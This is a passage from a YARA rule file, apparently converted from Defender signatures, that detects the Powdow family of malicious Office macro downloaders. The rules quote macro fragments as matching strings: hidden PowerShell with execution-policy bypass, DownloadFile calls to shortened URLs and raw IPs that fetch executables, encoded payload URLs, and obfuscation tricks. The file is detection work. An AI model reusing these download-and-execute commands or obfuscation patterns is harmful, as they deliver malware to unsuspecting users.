        $x_1_1 = {77 77 77 31 31 36 2e 7a 69 70 70 79 73 68 61 72 65 2e 63 6f 6d 2f 64 2f 33 73 57 71 68 6b 33 51 2f 32 36 39 2f 74 65 73 74 2e 70 73 31 3d 00 24 77 65 62 20 3d 20 27 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "fso1.CreateTextFile(\"c:\\run.bat\", True)" ascii //weight: 1
        $x_1_3 = "shell.Run \"run\"" ascii //weight: 1
        $x_1_4 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = "Sub Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_MF_2147765398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.MF!MTB"
        threat_id = "2147765398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"57 53 63 72 69 70 74 2E 53 68 65 6C 6C\")).Run" ascii //weight: 1
        $x_1_2 = "Loader\"aHR0cDovL2JyYW5kb3RvZGF5LmNvbS9TYW1wbGUzLmV4ZQ==" ascii //weight: 1
        $x_1_3 = "Base64Decode(\"cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3M" ascii //weight: 1
        $x_1_4 = "U2hlbGwuQXBwbGljYXRpb24pLlNoZWxsRXhlY3V0ZSgkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SMW_2147765442_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SMW!MTB"
        threat_id = "2147765442"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Loader \"68 74 74 70 73 3A 2F 2F 69 6E 73 74 69 74 75 74 6F 66 61 72 6D 75 6E 2E 63 6F 6D 2F 70 72 69 6E 63 65 2E 65 78 65" ascii //weight: 1
        $x_1_2 = ".Open \"G\" + \"E\" + \"T\", Url" ascii //weight: 1
        $x_1_3 = "(\"43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 73 76 63 68 6f 73 74 33 32 2e 65 78 65\")" ascii //weight: 1
        $x_1_4 = {20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-80] 28 22 35 37 20 35 33 20 36 33 20 37 32 20 36 39 20 37 30 20 37 34 20 32 65 20 35 33 20 36 38 20 36 35 20 36 63 20 36 63 20 22 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = "68 74 74 70 3A 2F 2F 77 77 77 2E 65 70 79 6F 72 6B 65 2E 65 64 75 2E 62 7A 2F 2F 6C 69 62 72 61 72 69 65 73 2F 53 75 6E 64 6F 77 6E 2E 65 78 65" ascii //weight: 1
        $x_1_6 = "68 74 74 70 73 3A 2F 2F 6D 61 6E 61 67 65 64 2E 6F 73 73 2D 63 6E 2D 62 65 69 6A 69 6E 67 2E 61 6C 69 79 75 6E 63 73 2E 63 6F 6D 2F 4F 6E 79 65 6D 5F 6D 6D 2E 65 78 65" ascii //weight: 1
        $x_1_7 = "68 74 74 70 3A 2F 2F 6D 61 73 73 64 69 73 70 2E 63 6F 6D 2F 69 6D 67 73 2F 74 65 6D 70 2F 70 72 65 64 67 66 72 74 2E 65 78 65" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSG_2147765450_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSG!MTB"
        threat_id = "2147765450"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {61 69 6d 73 6d 6f 74 69 6f 6e 2e 63 6f 6d 2e 6d 79 2f 64 61 74 61 31 2f 69 6d 61 67 65 73 2f 31 32 33 2e 65 78 65 20 2d 4f 75 74 46 69 6c 65 37 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Start-Process -FilePath \"C:\\Users\\Public\\Documents\\dejxaoqet.exe\"" ascii //weight: 1
        $x_1_3 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSI_2147765664_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSI!MTB"
        threat_id = "2147765664"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(fuckzargus).Exec" ascii //weight: 1
        $x_1_2 = {70 6f 74 61 74 6f 20 3d 20 22 57 53 63 72 22 0d 0a 70 6f 72 67 61 6e 64 61 20 3d 20 22 69 70 74 2e 22 0d 0a 6a 75 6c 61 74 61 20 3d 20 22 53 68 65 22 0d 0a 4a 6f 6b 65 72 20 3d 20 22 6c 6c 22}  //weight: 1, accuracy: High
        $x_1_3 = "p/dashda78923ejklaczxmc" ascii //weight: 1
        $x_1_4 = "p://%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40@j.m" ascii //weight: 1
        $x_1_5 = "yararulesfuckoff1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PV_2147765909_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PV!MTB"
        threat_id = "2147765909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "asd.Run (Z)" ascii //weight: 1
        $x_1_2 = "asd = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "Z = \"powershell -noP -sta -w 1 -enc" ascii //weight: 1
        $x_1_4 = "UwBFAHQALQBWAGEAUg" ascii //weight: 1
        $x_1_5 = "= Z + \"AnAFgAJwAsACcASQBFACcAKQA=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PV_2147765909_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PV!MTB"
        threat_id = "2147765909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= jkjuzixfqkudg & \".net\"" ascii //weight: 1
        $x_1_2 = "= \"pozxmcjsnqweasjasda.com\"" ascii //weight: 1
        $x_1_3 = "= \"ohqnjwenzhjcnqwera.com\"" ascii //weight: 1
        $x_1_4 = "Replace(yozfwjncwkvuo, \"654747654722911238\", \"p\")" ascii //weight: 1
        $x_1_5 = "Shell yozfwjncwkvuo" ascii //weight: 1
        $x_1_6 = "= Replace(yozfwjncwkvuo, \"CURRENT_DGA_DOMAIN\", jkjuzixfqkudg)" ascii //weight: 1
        $x_1_7 = "\"qwetyutopweertyiiiwertyd\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PW_2147766037_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PW!MTB"
        threat_id = "2147766037"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden" ascii //weight: 1
        $x_1_2 = {63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 49 44 33 2f 7a 2f [0-6] 2e 6a 70 67 32 00 68 74 74 70 3a 2f 2f 77 65 65 73 68 6f 70 70 69 2e}  //weight: 1, accuracy: Low
        $x_1_3 = "Start-Process -FilePath" ascii //weight: 1
        $x_1_4 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-10] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_5 = "winmgmts:win32_Process" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PW_2147766037_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PW!MTB"
        threat_id = "2147766037"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "myfunc1 = StrReverse(cad)" ascii //weight: 1
        $x_1_2 = "(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop\")" ascii //weight: 1
        $x_1_3 = ".Get(myfunc1(\"ssecorP_23niW\")).Create strArg, Null, Null, pid" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PX_2147766038_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PX!MTB"
        threat_id = "2147766038"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden" ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 33 35 2e 31 37 38 2e 37 35 2e 36 39 2f 38 2f [0-10] 2e 6a 70 67}  //weight: 1, accuracy: Low
        $x_1_3 = "Start-Process -FilePath" ascii //weight: 1
        $x_1_4 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 56 69 64 65 6f 73 5c [0-10] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_5 = "winmgmts:win32_Process" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YAB_2147766090_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YAB!MTB"
        threat_id = "2147766090"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Start-Process -FilePath \"C:\\Users\\Public\\fenxbztdh.exe" ascii //weight: 1
        $x_2_2 = "iwr http://79.141.165.173/DX/FD-20581.jpg -OutFile" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YK_2147766410_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YK!MTB"
        threat_id = "2147766410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "http://weeshoppi.com/wp-includes/ID3/g1/97103.jpg" ascii //weight: 2
        $x_1_2 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass" ascii //weight: 1
        $x_1_3 = "OutFile C:\\Users\\Public\\Documents\\jbnsdwj.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PY_2147766854_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PY!MTB"
        threat_id = "2147766854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden" ascii //weight: 1
        $x_1_2 = "http://185.183.98.246/150/DL-13306.jpg" ascii //weight: 1
        $x_1_3 = "Start-Process -FilePath" ascii //weight: 1
        $x_1_4 = "C:\\Users\\Public\\Documents\\iqilqolbl.exe" ascii //weight: 1
        $x_1_5 = "winmgmts:win32_Process" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TNY_2147766909_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TNY!MTB"
        threat_id = "2147766909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "po^wer^shell -w" ascii //weight: 1
        $x_1_2 = "('DownloadFile')" ascii //weight: 1
        $x_1_3 = "Invoke(('ht'+'tps://tinyurl.com/y6tcd96t'),'kc.exe')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TNY_2147766909_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TNY!MTB"
        threat_id = "2147766909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /cpowe^rshell -w 1 (nEw-oBje`cT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "Invoke\"\"('https://rb.gy/g64bwj','sh.exe')" ascii //weight: 1
        $x_1_4 = "Invoke\"\"('https://rb.gy/glywev','de.exe')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TNY_2147766909_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TNY!MTB"
        threat_id = "2147766909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "p^owershell -w 1" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "Start-Sleep 40" ascii //weight: 1
        $x_1_4 = "Invoke\"\"('https://tinyurl.com/y5gq29fv','pd.bat')" ascii //weight: 1
        $x_1_5 = "Invoke\"\"('https://tinyurl.com/y4bp38z3','pd.bat')\")" ascii //weight: 1
        $x_1_6 = "Invoke\"\"('https://tinyurl.com/y2cxps32','pd.bat')\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DOW_2147767015_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DOW!MTB"
        threat_id = "2147767015"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "Invoke\"('https://cutt.ly/GhjWXo2','pd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DOW_2147767015_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DOW!MTB"
        threat_id = "2147767015"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_2 = "p^ow^ershell -w" ascii //weight: 1
        $x_1_3 = "Invoke\"\"('https://tinyurl.com/y3csfywd','pd.bat')\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_XLL_2147767358_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.XLL!MTB"
        threat_id = "2147767358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /cpowe^rshell -w 1 (nEw-oBje`cT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
        $x_1_3 = "\"\"Invoke\"\"('https://cutt.ly/egD2WM2','ks.exe')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ULY_2147767528_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ULY!MTB"
        threat_id = "2147767528"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /k p^ower^shell -w 1 (nEw-oBje`cT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('DownloadFile')" ascii //weight: 1
        $x_1_3 = "Invoke(('ht'+'tps://tinyurl.com/y4pthed2'),'ye.exe')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CUK_2147767531_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CUK!MTB"
        threat_id = "2147767531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set ffkkjtesvdlbooezmuzouotfp  = CreateObject(Range(\"A4\").Value)" ascii //weight: 1
        $x_1_2 = "Dim kmojrrkvizfiquwgsrqawrivn" ascii //weight: 1
        $x_1_3 = "nfiguvfwvuhleyklsstxegftb = Range(\"A3\").Value" ascii //weight: 1
        $x_1_4 = "kmojrrkvizfiquwgsrqawrivn = ffkkjtesvdlbooezmuzouotfp.Create(nfiguvfwvuhleyklsstxegftb)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RI_2147767625_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RI!MTB"
        threat_id = "2147767625"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "str = str +" ascii //weight: 1
        $x_1_2 = "powershell.exe -NoP -NonI -W Hidden -Command \"\"Invoke-\"" ascii //weight: 1
        $x_1_3 = "exec + \"Expression" ascii //weight: 1
        $x_1_4 = "IO.MemoryStream (,$([Convert]::FromBase64String\"" ascii //weight: 1
        $x_1_5 = "exec + \"I)).ReadToEnd();\"\"\"" ascii //weight: 1
        $x_1_6 = "nVdLb+M2EL7nVxCGDjZiB9RbXiPAbrsosECxXTRpezB80INqhMqWIc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_QI_2147767703_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.QI!MTB"
        threat_id = "2147767703"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kaskdk.hissssa" ascii //weight: 1
        $x_1_2 = "Sub hissssa()" ascii //weight: 1
        $x_1_3 = "Shell pkkkk" ascii //weight: 1
        $x_1_4 = "tp://%748237%728748@j.mp/" ascii //weight: 1
        $x_1_5 = "adgkshkasgdhagsdjabnvcnzx" ascii //weight: 1
        $x_1_6 = "pdas3 = \"t\" + \"a ht\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PJ_2147767930_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PJ!MTB"
        threat_id = "2147767930"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ttps://tinyurl.com/y9kzn378" ascii //weight: 1
        $x_1_2 = "-w 1 (nEw-oB`jecT Net" ascii //weight: 1
        $x_1_3 = "WebcL`IENt)" ascii //weight: 1
        $x_1_4 = "n'+'loadFile')" ascii //weight: 1
        $x_1_5 = "-w 1 -EP bypass stARt`-slE`Ep 25;" ascii //weight: 1
        $x_1_6 = "cd ${enV`:appdata};" ascii //weight: 1
        $x_1_7 = "EXEC(CHAR(112)&CHAR(111)&CHAR(119)&CHAR(101)&CHAR(114)&CHAR(115)&CHAR(104)&CHAR(101)&CHAR(108)&CHAR(108)&" ascii //weight: 1
        $x_1_8 = "dadadadafafafafa" ascii //weight: 1
        $x_1_9 = "useless cell" ascii //weight: 1
        $x_1_10 = "magic cell" ascii //weight: 1
        $x_1_11 = "epic cell" ascii //weight: 1
        $x_1_12 = {28 27 2e 27 2b 27 2f ?? ?? 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TNL_2147768049_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TNL!MTB"
        threat_id = "2147768049"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /k p^ower^shell -w 1 (nEw-oBje`cT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('DownloadFile')" ascii //weight: 1
        $x_1_3 = "Invoke(('ht'+'tps://tinyurl.com/yxdxj7ju'),'ye.exe')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_HDV_2147768457_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.HDV!MTB"
        threat_id = "2147768457"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VAR63 = \"https://lakammes.xyz/hdcdrive4.exe\"" ascii //weight: 1
        $x_1_2 = "VAR65 = Environ$(\"tmp\") & \"\\\" & \"hdcdrive4.exe\"" ascii //weight: 1
        $x_1_3 = "If CreateProcess(VAR65, \"\", 0&, 0&, 1&, 0&, 0&, \"C:\\\", si, pi) = 0 Then Call Err.Raise(517, ," ascii //weight: 1
        $x_1_4 = "If Left$(VAR107, InStr(VAR107, Chr$(0))) <> 200 Then" ascii //weight: 1
        $x_1_5 = "If VAR66(VAR63, VAR62) Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PTT_2147768563_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PTT!MTB"
        threat_id = "2147768563"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Attribute VB_Name = \"hithithit\"" ascii //weight: 1
        $x_1_2 = "lahab2 = \"djka\" + \"aah\" + \"dasdhkasj\" + \"asdhksdb\" + \"hd\"" ascii //weight: 1
        $x_1_3 = "yadeez3 = \"t\" + \"a h\" + \"t\"" ascii //weight: 1
        $x_1_4 = "lahab1 = \"tp://%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40%40@j.mp/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDB_2147768670_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDB!MTB"
        threat_id = "2147768670"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile')" ascii //weight: 1
